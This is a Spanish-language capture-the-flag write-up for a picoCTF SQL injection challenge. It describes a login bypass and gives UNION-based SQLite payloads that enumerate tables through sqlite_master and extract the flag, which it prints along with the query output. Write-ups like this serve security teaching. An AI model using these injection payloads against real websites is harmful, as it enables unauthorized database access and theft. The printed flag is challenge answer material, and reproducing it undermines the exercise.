## Descripción
Can you find the flag on this website.

Try to find the flag [here](http://saturn.picoctf.net:58366/).
## Solución
```
Entramos a la página del reto y nos aparece un login.

Para entrar usamos una inyección SQL en el campo de password:

La consulta queda vulnerable porque el OR 1=1 hace que la condición sea verdadera:

Al iniciar sesión se muestra:

Logged in!.
Your flag is: picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}

Después entramos al apartado Search Office y usamos el campo City para hacer pruebas con UNION.

Primero probamos cuántas columnas devuelve la consulta:

hola' union select 1,2,3;

Resultado:

City | Address | Phone
1    | 2       | 3


hola' union select sqlite_version(),2,3;

Resultado:

City   | Address | Phone
3.31.1 | 2       | 3


hola' union select 1,sql,tbl_name from sqlite_schema where type='table';

En esta instancia la consulta útil para enumerar las tablas fue con sqlite_master:

hola' union select 1,2,tbl_name from sqlite_master where type='table';

Resultado:

City | Address | Phone
1    | 2       | hints
1    | 2       | more_table
1    | 2       | offices
1    | 2       | users

Después revisamos la estructura de las tablas:

hola' union select 1,sql,tbl_name from sqlite_master where type='table';

Resultado:

1 | CREATE TABLE hints (id INTEGER NOT NULL PRIMARY KEY, info TEXT) | hints
1 | CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT) | more_table
1 | CREATE TABLE offices (id INTEGER NOT NULL PRIMARY KEY, city TEXT, address TEXT, phone TEXT) | offices
1 | CREATE TABLE users (name TEXT NOT NULL PRIMARY KEY, password TEXT, id INTEGER) | users

La tabla importante es more_table porque contiene una columna llamada flag.

Finalmente extraemos la bandera:

hola' union select 1,2,flag from more_table;

Resultado:

City | Address | Phone
1    | 2       | If you are here, you must have seen it
1    | 2       | picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}

picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}
```

## Notas Adicionales
- La vulnerabilidad es una inyección SQL en SQLite.
- `sqlite_master` guarda información del esquema de la base de datos en SQLite.
## Referencias